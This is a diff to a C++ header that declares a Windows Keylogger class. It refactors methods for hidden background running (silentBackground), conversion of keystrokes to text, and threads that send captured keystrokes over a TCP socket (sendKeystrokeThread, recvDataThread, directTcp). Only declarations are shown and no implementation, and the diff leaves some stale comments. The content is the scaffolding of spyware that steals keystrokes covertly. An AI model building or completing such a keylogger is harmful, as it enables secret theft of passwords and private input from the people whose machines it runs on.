@@ -10,25 +10,21 @@ class Keylogger
 {
     public:
 
-        Keylogger(SOCKET &sock);
+        Keylogger();
         //-----------------------------------------------
         VOID setup();
         //-----------------------------------------------
         wstring specialKey(INT &keystroke);
         wstring intToUnicode(INT keystroke);
         //-----------------------------------------------
-        static DWORD WINAPI StaticThreadStart(void* param);
-        HANDLE startThread(); //starts a thread of the directTCp method and returns are HANDLE
-        struct PARAMETERS; //https://stackoverflow.com/questions/8994224/efficiently-passing-parameters-to-function-in-another-thread-in-c
-        VOID directTcp();
-        //-----------------------------------------------
-        VOID waitingEndSession(HANDLE &thread_to_finish);//waits to receive an end-of-connection message  for directTcp
-        //-----------------------------------------------
+        VOID directTcp(); //starts a thread of the directTCp method and returns are HANDLE
+        //-----------------------------------------------        //-----------------------------------------------
         VOID silentBackground();
         //-----------------------------------------------
         SOCKET getSocket();
         //-----------------------------------------------
-        VOID test();
+        VOID setSocket(SOCKET &sock);
+        //-----------------------------------------------
         ~Keylogger();
         
         SOCKET public_sock;
@@ -41,5 +37,9 @@ class Keylogger
         HKL a_hkl;
      
 };
+
+DWORD WINAPI sendKeystrokeThread(LPVOID param);
+DWORD WINAPI recvDataThread(LPVOID param);
+//DWORD WINAPI directTcp(LPVOID param)
 
 #endif
